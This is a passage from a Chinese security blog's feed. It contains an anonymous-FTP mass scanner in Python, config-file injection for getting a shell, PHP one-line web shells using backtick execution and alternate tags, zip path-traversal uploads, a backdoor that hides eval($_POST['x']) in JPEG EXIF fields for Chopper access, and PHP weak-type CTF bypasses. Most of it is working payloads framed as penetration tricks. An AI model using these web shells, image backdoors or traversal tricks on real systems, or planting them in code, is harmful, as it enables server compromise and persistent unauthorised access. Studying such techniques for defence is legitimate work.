class="string">'ftp1.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">hostpath=<span class="string">'host.txt'</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_anonymous</span><span class="params">(ip,num)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ftp =FTP(ip,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> ftp.login() <span class="keyword">and</span> len(ftp.nlst())&gt;<span class="number">2</span>:</span><br><span class="line">            ftp.quit()</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"%s : %s ok"</span>%(num,ip))</span><br><span class="line">            ftpfile.write(ip+<span class="string">'\n'</span>)  </span><br><span class="line">        <span class="keyword">else</span> : </span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"%s : %s nothing"</span>%(num,ip))</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception,ex:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"%s : %s %s"</span>%(num,ip,ex))</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">truetrue</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlin</span><span class="params">(li)</span>:</span></span><br><span class="line">    con=linecache.getline(hostpath,li).strip(<span class="string">'\n\r\t'</span>)</span><br><span class="line">    <span class="keyword">if</span> con: <span class="keyword">return</span> con</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    a=len(linecache.getlines(hostpath))</span><br><span class="line">    threads=[]</span><br><span class="line">    th=<span class="number">20</span></span><br><span class="line">    <span class="keyword">while</span> x&lt;a:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,th+x):</span><br><span class="line">            <span class="keyword">if</span> getlin(i+<span class="number">1</span>):</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                temp=threading.Thread(target=is_anonymous,args=(getlin(i+<span class="number">1</span>),i))</span><br><span class="line">                threads.append(temp)</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)): </span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].join()</span><br><span class="line">        x=x+th</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>脚本下载：<a href="https://git.oschina.net/Free_V/FtpTesting.git" target="_blank" rel="external">https://git.oschina.net/Free_V/FtpTesting.git</a> </p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>ft]]>
    </summary>
    
      <category term="python" scheme="http://www.freev.cc/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[后台配置getshell总结]]></title>
    <link href="http://www.freev.cc/2016/02/06/%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AEgetshell%E6%80%BB%E7%BB%93/"/>
    <id>http://www.freev.cc/2016/02/06/后台配置getshell总结/</id>
    <published>2016-02-06T11:03:24.000Z</published>
    <updated>2016-09-02T06:16:58.501Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x00__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x00 配置文件单引号"></a>0x00 配置文件单引号</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">'1'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">   //利用反斜杠转义第二个单引号  利用‘//‘注释后面语句</span><br><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">'127.0.0.1\'</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">';echo '</span><span class="number">1</span><span class="string">';//11'</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">'xx'</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7"><a href="#0x01__u914D_u7F6E_u6587_u4EF6_u53CC_u5F15_u53F7" class="headerlink" title="0x01 配置文件双引号"></a>0x01 配置文件双引号</h2><p>利用php双引号特点</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    <span class="variable">$host</span>=<span class="string">"&#123;$&#123;`net user`&#125;&#125;"</span>;</span><br><span class="line">    <span class="variable">$uncode</span>=<span class="string">"utf-8"</span>;</span><br><span class="line">    <span class="variable">$username</span>=<span class="string">"xx"</span>;</span><br><span class="line">    <span class="variable">$upload</span>=<span class="string">'/a'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>//如果配置文件对敏感字符进行转义而没有对 ‘/’进行转义</p>
<h2 id="0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x02__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x02 配置文件单引号"></a>0x02 配置文件单引号</h2><h2 id="0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7"><a href="#0x03__u914D_u7F6E_u6587_u4EF6_u5355_u5F15_u53F7" class="headerlink" title="0x03 配置文件单引号"></a>0x03 配置文件单引号</h2>]]></content>
    <summary type="html">
    <![CDATA[<span id="busuanzi_container_page_pv"></span>]]>
    
    </summary>
    
      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一个php木马引发的xxoo]]></title>
    <link href="http://www.freev.cc/2016/01/30/%E4%B8%80%E4%B8%AAphp%E6%9C%A8%E9%A9%AC%E5%BC%95%E5%8F%91%E7%9A%84xxoo/"/>
    <id>http://www.freev.cc/2016/01/30/一个php木马引发的xxoo/</id>
    <published>2016-01-30T01:27:25.000Z</published>
    <updated>2016-09-02T06:16:56.950Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br><span class="line">&lt;% <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`%&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E"><a href="#0x01__u53EF_u6267_u884Cphp_u4EE3_u7801_u7684_u6807_u7B7E" class="headerlink" title="0x01 可执行php代码的标签"></a>0x01 可执行php代码的标签</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="var_expand">% echo <span class="escape">`$</span>_GET[1]<span class="escape">`%</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要开启asp_tags=On<br>php3可以通过 short_tags() 函数激活使用短标签 </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span> phpinfo()<span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>需要在phpini中开启shor_tags()</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">language</span>=<span class="value">"php"</span>&gt;</span><span class="undefined"></span><br><span class="line">echo phpinfo;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过js执行php代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?</span>=`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span></span><br></pre></td></tr></table></figure>
<p>这里‘=’相当于echo</p>
<h2 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>闭合标签可以不必要写，但是需要加上‘;’<br>以上php执行方式通常用于bypass绕过php执行标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span> <span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'xx'</span>;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00__u5076_u9047php_u9A6C"><a href="#0x00__u5076_u9047php_u9A6C" class="headerlink" title="0x00 偶遇php马"></a>0x00 偶遇php马</h2><figure]]>
    </summary>
    
      <category term="php代码安全" scheme="http://www.freev.cc/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[上传之万恶的zip]]></title>
    <link href="http://www.freev.cc/2015/12/16/%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%87%E6%81%B6%E7%9A%84zip/"/>
    <id>http://www.freev.cc/2015/12/16/上传之万恶的zip/</id>
    <published>2015-12-16T03:46:22.000Z</published>
    <updated>2016-09-02T06:16:57.777Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2><p>1,找一张图片命令xxx11.jpg然后压缩</p>
<p>2,用二进制文件编辑器打开，我这里用的是UE，ctrl+f查找xxx替换成../，(注意有两处)</p>
<p>3,然后解压，你会发现11.jpg文件被解压到了文件目录的上一层</p>
<h2 id="0X01__u5229_u7528"><a href="#0X01__u5229_u7528" class="headerlink" title="0X01 利用"></a>0X01 利用</h2><p>如果我们在渗透过程中遇到zip上传，而且解压，但是解压之后的文件目录没有php的执行权限，或者php文件被自动删除。<br>那么zip大法就能搞定了，附上解压代码。</p>
<pre><code>&lt;?php 
    header(&quot;Content-type:text/html;charset=utf-8&quot;);
    function get_zip($filename,$path=null){

        $i=0;
        if(!file_exists($filename))
            die (&quot;&quot;);
        $filename=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$filename);
        $path=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$path);
        $resource = zip_open($filename);
        while($dir_res=zip_read($resource)){

            if (zip_entry_open($resource,$dir_res)) {
                $res_name= zip_entry_name($dir_res);

                $file_name = $path.$res_name;
                echo $file_name;
                $file_path = substr($file_name,0,strrpos($file_name, &quot;/&quot;));
                if(!is_dir($file_path)){
                    mkdir($file_path,0777,true);
                }
                if(!is_dir($file_name)){
                    $file_size=zip_entry_filesize($dir_res);
                    if($file_size&lt;(1024*1024*6)){
                        $file_content = zip_entry_read($dir_res,$file_size);
                        file_put_contents($file_name,$file_content);
                    }else{
                        echo &quot;&lt;p&gt; &quot;.$i++.&quot; ， -&gt; &quot;.iconv(&quot;gb2312&quot;,&quot;utf-8&quot;,$file_name).&quot; &lt;/p&gt;&quot;;
                    }

                }
            }

        }

    }
    get_zip(&quot;11.zip&quot;,&apos;temp/&apos;);
?&gt;
</code></pre><h2 id="0X03__u6269_u5C55"><a href="#0X03__u6269_u5C55" class="headerlink" title="0X03 扩展"></a>0X03 扩展</h2><p>如果我们有权限，也可以在解压目录中创建目录<br>原理相同把上述的xxx改成xx/，那么就会在文件目录下创建一个xx的目录，图片的路径就变成了temp/xx/11.jpg</p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件]]>
    </summary>
    
      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php高级图片隐藏马]]></title>
    <link href="http://www.freev.cc/2015/12/11/php%E9%AB%98%E7%BA%A7%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E9%A9%AC/"/>
    <id>http://www.freev.cc/2015/12/11/php高级图片隐藏马/</id>
    <published>2015-12-11T07:47:50.000Z</published>
    <updated>2016-09-02T06:16:40.181Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在</p>
<p>JPEG格式头部插入了数码照片的信息，包括拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。你可以利用任何可以查看JPEG文件的看图软件浏览Exif格式的照片，但并不是所有的图形程序都能处理Exif信息</p>
<p>php 中exif_read_data,可以读取EXIF的信息头，但是需要开启php_exif的模板</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line"></span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>  输出<br>  <figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line"><span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449824391</span></span><br><span class="line"><span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line"><span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line"><span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line"><span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF'</span> (length=<span class="number">19</span>)</span><br><span class="line"><span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span></span><br><span class="line">    <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">    <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">    <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">    <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">    <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line"><span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x01__u7325_u7410_u5229_u7528"><a href="#0x01__u7325_u7410_u5229_u7528" class="headerlink" title="0x01 猥琐利用"></a>0x01 猥琐利用</h2><p>右键点击图片，属性-》详细信息-》标记-》填写shell;<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449825529</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'shell'</span> (length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure></p>
<p>可见下最下面多了一条’Keywords’ =&gt; string ‘shell’ (length=5)<br>下面构造一句话,右键点击图片，属性-》详细信息-》标记-》填写<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST[</span><span class="string">'x'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line">assert(<span class="variable">$exit</span>[<span class="string">'Keywords'</span>]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>菜刀连之，即可,</p>
<h2 id="0x02_u603B_u7ED3"><a href="#0x02_u603B_u7ED3" class="headerlink" title="0x02总结"></a>0x02总结</h2><p>同样你把一句话不写在标记里面，写在主题，标题，作者等都是一样的。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449827712</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'ImageDescription'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Artist'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Title'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Author'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Subject'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br></pre></td></tr></table></figure></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格]]>
    </summary>
    
      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php弱类型安全]]></title>
    <link href="http://www.freev.cc/2015/12/09/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/"/>
    <id>http://www.freev.cc/2015/12/09/php弱类型安全/</id>
    <published>2015-12-09T04:51:21.000Z</published>
    <updated>2016-12-06T05:43:01.439Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型</p>
<p>例如php 中的当php中使用‘==’时会自动类型转换<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line">true<span class="variable">$b</span>=<span class="string">'1asd'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="number">1</span>==<span class="variable">$b</span>)</span><br><span class="line">truetrueecho <span class="string">"yes"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>如下代码都是我在ctf中遇到的题型<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">true<span class="variable">$test</span>=$_GET[<span class="string">'test'</span>]; //test=<span class="number">240610708</span></span><br><span class="line">trueecho <span class="variable">$test</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">true<span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line">true<span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123;   //0exxx=<span class="number">0</span>  <span class="number">240610708</span></span><br><span class="line">truetrueecho <span class="string">"flag&#123;xxxxxx&#125;"</span>;</span><br><span class="line">true&#125;<span class="keyword">else</span> </span><br><span class="line">truetrueecho <span class="string">"you are falied!"</span>;</span><br><span class="line">trueecho  <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>test=240610708 就可以绕过了，因为240610708的md5是0e…..php自动类型转换时候就是0</p>
<h2 id="0x01_u7325_u7410_u5229_u7528"><a href="#0x01_u7325_u7410_u5229_u7528" class="headerlink" title="0x01猥琐利用"></a>0x01猥琐利用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3.php</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span> </span><br><span class="line">true<span class="variable">$flag</span>=<span class="string">'xx'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">    	<span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">        	<span class="keyword">echo</span> (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">truetrue<span class="keyword">else</span></span><br><span class="line">truetruetrue<span class="keyword">echo</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">truetrue&#125;</span><br><span class="line"> <span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这道题与2.php的区别就是’==’换成了’===’<br>提交a[]=1&amp;&amp;b[]=2,因为cmd5(a[])会报错，‘===’两边同时报错，也就是false===false弹出flag</p>
<pre><code>Author:FreeV
